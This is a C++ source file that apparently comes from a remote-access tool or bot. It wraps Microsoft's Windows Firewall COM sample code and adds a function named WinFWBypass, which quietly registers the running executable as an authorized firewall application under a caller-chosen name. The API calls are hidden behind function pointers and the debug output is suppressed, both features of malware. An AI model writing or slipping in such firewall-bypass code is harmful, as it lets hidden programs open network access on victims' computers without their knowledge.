 /*
    Copyright (c) Microsoft Corporation

    SYNOPSIS

        Sample code for the Windows Firewall COM interface.
*/

#include "stuff.h"
#include "externals.h"

#ifndef NO_FIREWALLBYPASS

HRESULT WindowsFirewallInitialize(OUT INetFwProfile** fwProfile)
{
    HRESULT hr = S_OK;
    INetFwMgr* fwMgr = NULL;
    INetFwPolicy* fwPolicy = NULL;

    _ASSERT(fwProfile != NULL);

    *fwProfile = NULL;

    // Create an instance of the firewall settings manager.
    hr = fCoCreateInstance(
            __uuidof(NetFwMgr),
            NULL,
            CLSCTX_INPROC_SERVER,
            __uuidof(INetFwMgr),
            (void**)&fwMgr
            );
    if (FAILED(hr))
    {
#ifdef DEBUG
        printf("CoCreateInstance failed: 0x%08lx\n", hr);
#endif
        goto error;
    }

    // Retrieve the local firewall policy.
    hr = fwMgr->get_LocalPolicy(&fwPolicy);
    if (FAILED(hr))
    {
#ifdef DEBUG
        printf("get_LocalPolicy failed: 0x%08lx\n", hr);
#endif
        goto error;
    }

    // Retrieve the firewall profile currently in effect.
    hr = fwPolicy->get_CurrentProfile(fwProfile);
    if (FAILED(hr))
    {
#ifdef DEBUG
        printf("get_CurrentProfile failed: 0x%08lx\n", hr);
#endif
        goto error;
    }

error:

    // Release the local firewall policy.
    if (fwPolicy != NULL)
    {
        fwPolicy->Release();
    }

    // Release the firewall settings manager.
    if (fwMgr != NULL)
    {
        fwMgr->Release();
    }

    return hr;
}


void WindowsFirewallCleanup(IN INetFwProfile* fwProfile)
{
    // Release the firewall profile.
    if (fwProfile != NULL)
    {
        fwProfile->Release();
    }
}


HRESULT WindowsFirewallAppIsEnabled(
            IN INetFwProfile* fwProfile,
            IN const wchar_t* fwProcessImageFileName,
            OUT BOOL* fwAppEnabled
            )
{
    HRESULT hr = S_OK;
    BSTR fwBstrProcessImageFileName = NULL;
    VARIANT_BOOL fwEnabled;
    INetFwAuthorizedApplication* fwApp = NULL;
    INetFwAuthorizedApplications* fwApps = NULL;

    _ASSERT(fwProfile != NULL);
    _ASSERT(fwProcessImageFileName != NULL);
    _ASSERT(fwAppEnabled != NULL);

    *fwAppEnabled = FALSE;

    // Retrieve the authorized application collection.
    hr = fwProfile->get_AuthorizedApplications(&fwApps);
    if (FAILED(hr))
    {
#ifdef DEBUG
        printf("get_AuthorizedApplications failed: 0x%08lx\n", hr);
#endif
        goto error;
    }

    // Allocate a BSTR for the process image file name.
    fwBstrProcessImageFileName = fSysAllocString(fwProcessImageFileName);

    if (fwBstrProcessImageFileName == NULL)
    {
        hr = E_OUTOFMEMORY;
#ifdef DEBUG
        printf("SysAllocString failed: 0x%08lx\n", hr);
#endif
        goto error;
    }


    // Attempt to retrieve the authorized application.
    hr = fwApps->Item(fwBstrProcessImageFileName, &fwApp);
    if (SUCCEEDED(hr))
    {
        // Find out if the authorized application is enabled.
        hr = fwApp->get_Enabled(&fwEnabled);
        if (FAILED(hr))
        {
#ifdef DEBUG
            printf("get_Enabled failed: 0x%08lx\n", hr);
            goto error;
#endif
        }

        if (fwEnabled != VARIANT_FALSE)
        {
            // The authorized application is enabled.
            *fwAppEnabled = TRUE;
#ifdef DEBUG
            printf(
                "Authorized application %lS is enabled in the firewall.\n",
                fwProcessImageFileName
                );
#endif
        }
        else
        {
#ifdef DEBUG
            printf(
                "Authorized application %lS is disabled in the firewall.\n",
                fwProcessImageFileName
                );
#endif
        }
    }
    else
    {
        // The authorized application was not in the collection.
        hr = S_OK;
#ifdef DEBUG
        printf(
            "Authorized application %lS is disabled in the firewall.\n",
            fwProcessImageFileName
            );
#endif
    }

error:

    // Free the BSTR.
    fSysFreeString(fwBstrProcessImageFileName);

    // Release the authorized application instance.
    if (fwApp != NULL)
    {
        fwApp->Release();
    }

    // Release the authorized application collection.
    if (fwApps != NULL)
    {
        fwApps->Release();
    }

    return hr;
} 


HRESULT WindowsFirewallAddApp(
            IN INetFwProfile* fwProfile,
            IN const wchar_t* fwProcessImageFileName,
            IN const wchar_t* fwName
            )
{
    HRESULT hr = S_OK;
    BOOL fwAppEnabled;
    BSTR fwBstrName = NULL;
    BSTR fwBstrProcessImageFileName = NULL;
    INetFwAuthorizedApplication* fwApp = NULL;
    INetFwAuthorizedApplications* fwApps = NULL;

    _ASSERT(fwProfile != NULL);
    _ASSERT(fwProcessImageFileName != NULL);
    _ASSERT(fwName != NULL);

    // First check to see if the application is already authorized.
    hr = WindowsFirewallAppIsEnabled(
            fwProfile,
            fwProcessImageFileName,
            &fwAppEnabled
            );

    if (FAILED(hr))
    {
#ifdef DEBUG
        printf("WindowsFirewallAppIsEnabled failed: 0x%08lx\n", hr);
#endif
        goto error;
    }

    // Only add the application if it isn't already authorized.
    if (!fwAppEnabled)
    {
        // Retrieve the authorized application collection.
        hr = fwProfile->get_AuthorizedApplications(&fwApps);
        if (FAILED(hr))
        {
#ifdef DEBUG
            printf("get_AuthorizedApplications failed: 0x%08lx\n", hr);
#endif
            goto error;
        }

        // Create an instance of an authorized application.
        hr = fCoCreateInstance(
                __uuidof(NetFwAuthorizedApplication),
                NULL,
                CLSCTX_INPROC_SERVER,
                __uuidof(INetFwAuthorizedApplication),
                (void**)&fwApp
                );
        if (FAILED(hr))
        {
#ifdef DEBUG
            printf("CoCreateInstance failed: 0x%08lx\n", hr);
#endif
            goto error;
        }

        // Allocate a BSTR for the process image file name.
        fwBstrProcessImageFileName = fSysAllocString(fwProcessImageFileName);
        if (fwBstrProcessImageFileName == NULL)
        {
            hr = E_OUTOFMEMORY;
#ifdef DEBUG
            printf("SysAllocString failed: 0x%08lx\n", hr);
#endif
            goto error;
        }

        // Set the process image file name.
        hr = fwApp->put_ProcessImageFileName(fwBstrProcessImageFileName);
        if (FAILED(hr))
        {
#ifdef DEBUG
            printf("put_ProcessImageFileName failed: 0x%08lx\n", hr);
#endif
            goto error;
        }

        // Allocate a BSTR for the application friendly name.
        fwBstrName = fSysAllocString(fwName);
        if (fSysStringLen(fwBstrName) == 0)
        {
            hr = E_OUTOFMEMORY;
#ifdef DEBUG
            printf("SysAllocString failed: 0x%08lx\n", hr);
#endif
            goto error;
        }

        // Set the application friendly name.
        hr = fwApp->put_Name(fwBstrName);
        if (FAILED(hr))
        {
#ifdef DEBUG
            printf("put_Name failed: 0x%08lx\n", hr);
#endif
            goto error;
        }

        // Add the application to the collection.
        hr = fwApps->Add(fwApp);
        if (FAILED(hr))
        {
#ifdef DEBUG
            printf("Add failed: 0x%08lx\n", hr);
#endif
            goto error;
        }
#ifdef DEBUG
        printf(
            "Authorized application %lS is now enabled in the firewall.\n",
            fwProcessImageFileName
            );
#endif
    }

error:

    // Free the BSTRs.
    fSysFreeString(fwBstrName);
    fSysFreeString(fwBstrProcessImageFileName);

    // Release the authorized application instance.
    if (fwApp != NULL)
    {
        fwApp->Release();
    }

    // Release the authorized application collection.
    if (fwApps != NULL)
    {
        fwApps->Release();
    }

    return hr;
}


BOOL CheckWin2k()
{
	OSVERSIONINFO	verinfo;

	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	fGetVersionEx(&verinfo);

	if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0)
		return TRUE;
	else
		return FALSE;
}


int WinFWBypass(char *desc)
{
    HRESULT hr = S_OK;
    HRESULT comInit = E_FAIL;
    INetFwProfile* fwProfile = NULL;
	char		temp[MAX_PATH];
	wchar_t		path[MAX_PATH], 
				name[MAX_PATH];

	if (CheckWin2k())
		return 0;

    // Initialize COM.
    comInit = fCoInitializeEx(
                0,
                COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE
                );

   // Ignore RPC_E_CHANGED_MODE; this just means that COM has already been
   // initialized with a different mode. Since we don't care what the mode is,
   // we'll just use the existing mode.
   if (comInit != RPC_E_CHANGED_MODE)
   {
        hr = comInit;
        if (FAILED(hr))
        {
#ifdef DEBUG
            printf("CoInitializeEx failed: 0x%08lx\n", hr);
#endif
            goto error;
        }
   }

    // Retrieve the firewall profile currently in effect.
    hr = WindowsFirewallInitialize(&fwProfile);
    if (FAILED(hr))
    {
#ifdef DEBUG
        printf("WindowsFirewallInitialize failed: 0x%08lx\n", hr);
#endif
        goto error;
    }

	fGetModuleFileName(0, temp, sizeof(temp));


	fMultiByteToWideChar(CP_ACP, 0, temp, -1, path, 256);
	fMultiByteToWideChar(CP_ACP, 0, desc, -1, name, 256);
    
    hr = WindowsFirewallAddApp(
            fwProfile,
			//L"D:\\coding\\dt3\\server\\Release\\server.exe",
			//L"Tester"
            path,
            name
            );
    if (FAILED(hr))
    {
#ifdef DEBUG
        printf("WindowsFirewallAddApp failed: 0x%08lx\n", hr);
#endif
        goto error;
    }

error:

    // Release the firewall profile.
    WindowsFirewallCleanup(fwProfile);

    // Uninitialize COM.
    if (SUCCEEDED(comInit))
    {
        fCoUninitialize();
    }

    return 0;
}

#endif